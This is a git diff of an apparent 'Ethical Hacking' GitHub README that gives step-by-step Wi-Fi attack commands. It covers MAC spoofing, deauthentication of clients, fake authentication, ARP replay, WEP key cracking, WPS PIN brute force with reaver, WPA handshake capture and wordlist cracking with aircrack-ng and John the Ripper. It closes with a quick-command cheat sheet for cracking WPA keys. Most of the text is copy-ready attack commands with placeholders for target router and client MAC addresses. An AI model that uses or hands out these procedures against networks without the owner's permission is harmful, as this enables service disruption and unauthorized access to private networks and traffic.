@@ -35,6 +35,7 @@ sudo su
   - [1. Pre-Connection Attack](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#1-pre-connection-attack-1)
     - Packet Sniffing
     - De-Authentication Attack
+    - Fake-Authentication Attack
   - [2. Ganing Access](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#2-gaining-access)
     - WEP Cracking
     - WPA / WPA2 Cracking
@@ -98,25 +99,20 @@ airmon-ng stop wlan1
 aireplay-ng --test wlan1
 ```
 
- Access Point Creation Test
+Access Point Creation Test
+
 you can put any fake MAC Address like this `00:01:02:03:04:05`
 
 ```
-airbase-ng -a 00:01:02:03:04:05 --essid "test_01" -c 11 wlan1
+airbase-ng -a 00:01:02:03:04:05 --essid "{AP_name}" -c {channel_no.} wlan1
 ```
 
 ---
 
 # Network Hacking
-
-### [1. Pre-Connection Attack](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#1-pre-connection-attack-1)
-
-### [2. Ganing Access](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#2-gaining-access)
-
-### [3. Post-Connection Attack]()
-
+### Changing MAC Address
 <details>
-    <summary>What is MAC Address ?</summary>
+    <summary>About MAC Address ?</summary>
 MAC address stands for Media Access Control,
 it's a permanent, physical, and unique address
 assigned to network interfaces
@@ -161,7 +157,6 @@ with specific MAC addresses can connect to,
 and you will also be able to hide your identity.
 </details>
 
-### Changing MAC Address
 
 1. step
 
@@ -192,25 +187,19 @@ to the original one once you restart the computer,
 because we're only changing the MAC address in memory,
 we're not really changing the physical MAC address.
 
-```
-ifconfig wlan1 down
-ifconfig wlan1 hw ether 00:11:22:33:44:55
-ifconfig wlan1 up
-```
-
 ---
 
 # 1. Pre-Connection Attack
 
 <details>
-    <summary>What is Pre-Connection Attack ?</summary>
+    <summary>About Pre-Connection Attack ?</summary>
 A pre-connection attack is like a sneak attack on a computer or network before any proper connection is established. It's when a hacker tries to break into a system without actually logging in or getting permission. They might do this by scanning for vulnerabilities or trying to guess passwords. It's a bit like trying to break into a house before you even knock on the door.
 </details>
 
 ### Packet Sniffing
 
 <details>
-    <summary>What is Packet Sniffing ?</summary>
+    <summary>About Packet Sniffing ?</summary>
 Now that we have enabled monitor mode
 on our wireless interface,
 we are able to capture all the wifi packets
@@ -254,23 +243,17 @@ airodump-ng --band abg wlan1
  Capture data in a file `test`
 
 ```
-airodump-ng --bssid @1 --channel @2 --write test wlan1
+airodump-ng --bssid {router_MAC_add} --channel {channel_no.} --write (file_name_without_extension) wlan1
 ```
-
-@1 → `BSSID` of target
-
-@2 → Channel no. of target
-
- Open wireshark application to read captured data, captured in `test.cap`,
-
+You can use Wireshark to analyze data
 ```
 wireshark
 ```
 
-### DE-Authentication Attack
+## DE-Authentication Attack
 
 <details>
-    <summary>What is de-authentication attack ?</summary>
+    <summary>About de-authentication attack ?</summary>
 This attack allow us to disconnect any device,
 from any network, before connecting to any of these networks
 and without the need to know the password for the network.
@@ -289,31 +272,19 @@ we're gonna use a tool called { aireplay-ng }to do that.
 </details>
 
 ```
-aireplay-ng --deauth @1 -a @2 -c @3 wlan1
+aireplay-ng --deauth {no_of_deauth_packets} -a {router_MAC_add} -c {target_MAC_add} wlan1
 ```
-
-@1 → no. of packets you want to send
-
-@2 → BSSID of router
-
-@3 → MAC Address of the Client
-
 if it`s fails then, target router on specfic channel
 
 ```
-airodump-ng --bssid @1 --channel @2 wlan1
+airodump-ng --bssid {router_MAC_add} --channel {channel_no.} wlan1
 ```
-
-@1 → BSSID of target
-
-@2 → Channel number
-
 ---
 
 # 2. Gaining Access
 
 <details>
-    <summary>What is Gaining Acess ?</summary>
+    <summary>About Gaining Acess ?</summary>
 Once`s we connect to the network, we can do so many cool things. we will able to gather so much more info, we will be able to intercept the connection and see every things that the people sends whether it user name, passward, url and anything.
 And we will be able to modify data.
 &nbsp;
@@ -327,7 +298,7 @@ The only problem is if your target using encryption.
 # WEP Cracking
 
 <details>
-    <summary>Know about WEP ?</summary>
+    <summary>About WEP Encryption?</summary>
 <br/>
 ● Wired Equivalent Privacy. <br />
 ● Old encryption.<br />
@@ -380,74 +351,52 @@ ARP Request Replay<br />
 ● Keep doing this till we have enough IVs to crack the key.<br />
 </details>
 
+## 1. if target is busy
 First you need top capture data.
 
 ```
-airodump-ng --bssid @1 --channel @2 --write basic_wep wlan1
+airodump-ng --bssid {router_MAC_add} --channel {channel_no.} --write {file_name_without_extn} wlan1
 ```
-
-@1 → bssid of target router
-
-@2 → channel no.
-
-basic_web → file name
-
 We need to capture large no. of data, so that we are easily able crack key.
 
-### WEP Cracking using capture file `basic_wep.cap`
+### WEP Cracking using `.cap File`
 
 ```
-aircrack-ng basic_wep-01.cap
+aircrack-ng {captured_.cap_file}
 ```
-
 You Found Key like this `41:73:32:33:70`
 remove colon behind the number `41:73:32:33:70` → `4173323370` is you cracked key.
 
 ---
+## 2. if target is not busy
 if your target network is not busy, `we need network busy to capture the data, to crack the key` the solution is to force the AP to generate new packets with new IVs, because by default AP ingnore the request they get unless the device connect to the network or associated with it,
 
-### Fake-Authentication Attack
 
 > [!NOTE]\
-> do parlelly bottom three commnads
+> do parlelly bottom two commnads
 
+# Fake-Authentication Attack
+
+### Associate with router
 ```
-airodump-ng --bssid @1 --channel @2 --write basic_wep wlan1
+aireplay-ng --fakeauth 0 -a {router_MAC_add} -h {Your_NIC_MAC_add} waln1
 ```
-
-@1 → bssid of target router
-
-@2 → channel no.
-
-#### ARP Request Replay Attack
-
-```
-aireplay-ng --fakeauth 0 -a @1 -h @2 waln1
-```
-
-@1 → bssid of target
-
-@2 → Your wireless network adapter MAC Address, use `iwconfig`.<br/>
 
 it's literally just telling the target network look, I want to communicate with you, Don't ignore my request.<br/>
 here `--fakeauth 0` becuse we just need to associate with network once `--arprelpay` keep forcing the AP to produce another packet with a new IV. Keep doing this till we have enough IVs to crack the key.
 
+# ARP Request Replay Attack
+### Force Router to generate IVs
 ```
-aireplay-ng --arpreplay -b @1 -h @2 waln1
+aireplay-ng --arpreplay -b {router_MAC_add} -h {your_NIC_MAC_add} waln1
 ```
-
-@1 → bssid of target
-
-@2 → Your wireless network adapter MAC Address, use `iwconfig`.<br/>
-
-and then again do WEP Cracking
-
+### Crack WEP key Cracking
 ```
-aircrack-ng basic_wep-01.cap
+aircrack-ng {.cap}
 ```
 
 ---
-
+---
 # WPA / WPA2 Cracking
 
 <details>
@@ -478,12 +427,12 @@ Authentication).<br/>
 not.<br/>
 </details>
 
-## WPA / WPA2 Cracking Without Word list
+## 1. WPA / WPA2 Cracking `Without Word list`
 
-show WPS Enable Network Around us
+ Scan WPS Enable Network Around us
 
 ```
-wash --interface waln1
+wash --interface wlan1
 ```
 
 Fake-Authentication Attack
@@ -491,103 +440,125 @@ Fake-Authentication Attack
 > do bottom two commands parlelly
 
 ```
-aireplay-ng --fakeauth 30 -a @1 -h @2 wlan1
+aireplay-ng --fakeauth {delay} -a {router_MAC_add} -h {your_NIC_MAC} wlan1
 ```
-
-30 → is delay
-
-@1 → MAC Address of target
-
-@2 → MAC Address of Network interface card in monitor mode.
+>[!WARNING]\
+>Current version of reaver have some bugs, you can use old version
+>
+>I have added old version of `reaver` in my github repo.
 
 Brute force the pin
-
 ```
-reaver --bssid @1 --channel @2 --interface wlan1 -vvv --no-associate 
+reaver --bssid {router_MAC_add} --channel {channel_no.} --interface wlan1 -vvv --no-associate 
 ```
-
 ---
-# WPA Handshake Capture
+## 2. WPA / WPA2 Cracking  using `With Word list` or `john-the-riper` tool
+### WPA Handshake Capture
 ```
-airodump-ng --bssid @ --channel @ --write wpa_handshake wlan1
+airodump-ng --bssid {router_MAc_add} --channel {channel_no.} --write {file_name_without_extn} wlan1
 ```
 >[!NOTE]\
 >Handshake is captured only when new client is connected. we can't wait so use de-authentication attack `parlelly`.
 
 ### De-authentication attack
 ```
-aireplay-ng --deauth 4 -a @ -c @ wlan1
+aireplay-ng --deauth {no_of_deauth_packet} -a {router_MAC_add} -c {target_d_MAc_add} wlan1
 ```
-### create word list
+---
+# create word list
 ```
 man crunch
 crunch 6 8 {key length} abc12 {char used} -o test.txt
 ```
-create word list using pattern
+### Create word list using pattern
 ```
-crunch 6 8 {key length} abc12 {char used} -o test.txt -t a@@@@b
+crunch {key_length Ex: 6 8} {char_used Ex: abc12} -o {.txt} -t {patter Ex: a@@@@b}
+```
+---
+# WPA-key Cracking using `ordlist`
+```
+aircrack-ng {.cap} -w {Wordlist.txt}
+```
+---
+## WPA-key Cracking using `John-the-riper` tool
+### Convert `.cap` to `.hccap` format
+```
+aircrack-ng {.cap} -J {extension_name_not_required}
+```
+### `.hccap` to `.txt`
+```
+hccap2john {.hccap} > {.txt}
 ```
 
-### Crack WPA-key using handshake file
+### passward cracking using `John-the-riper` package
 ```
-aircrack-ng wpa_handshake-01.cap -w test.txt
+john {.txt}
 ```
+
 # ===}> [Keep Supporting me on YouTube](https://www.youtube.com/@ohm_vishwa)
 ---
 ---
 ---
 
-# Common Commands
+---
+---
+---
+## Quick Commands for Wifi Hacking `WPA/WAP2`
+Kill Network Manager
 ```
 airmon-ng check kill
 ```
+Changing MAC Address
 ```
 ifconfig wlan1 down
-```
-```
 ifconfig wlan1 hw ether 00:11:22:33:44:55
-```
-```
-airmon-ng start wlan1
-```
-```
 ifconfig wlan1 up
 ```
-network scanning
+Enable Monitor Mode
+```
+ifconfig wlan1 down
+airmon-ng start wlan1
+ifconfig wlan1 up
+```
+# WPA/WPA2 Key Cracking
+Scan Network
 ```
 airodump-ng --band abg wlan1
 ```
-WPA enabled
+Scan Taget Network
 ```
-wash --interface wlan1
+airodump-ng --bssid {} --channel {} wlan1
 ```
-deauth
-
-for  all
+Capture `WPA Handshake`
 ```
-aireplay-ng --deauth @1 -a @2 -c @3 wlan1
+airodump-ng --bssid {} --channel {} --write {} wlan1
 ```
-for single
+De-authentication Attack
 ```
-airodump-ng --bssid @1 --channel @2 wlan1
+aireplay-ng --deauth 5 -a {} -c {} wlan1
 ```
-WPA Handshake
+`.cap` ===}> `.hccap` 
 ```
-airodump-ng --bssid @ --channel @ --write wpa_handshake wlan1
+aircrack-ng {} -J {extension_name_not_required}
 ```
-Key cracking
+`.hccap` ===}> `.txt` 
 ```
-aircrack-ng wpa_handshake-01.cap -w test.txt
+hccpa2john {} > {}
 ```
+Crack the Key using `John-the-riper` tool
 ```
+john {}
+```
+---
+---
+---
+Disable Monitor Mode
+```
+ifconfig wlan1 down
 airmon-ng stop wlan1
+ifconfig wlan1 up
 ```
+Restart Network Manager
 ```
 systemctl restart NetworkManager
-```
-```
-service NetworkManager start
-```
-```
-ifconfig wlan1 up
 ```
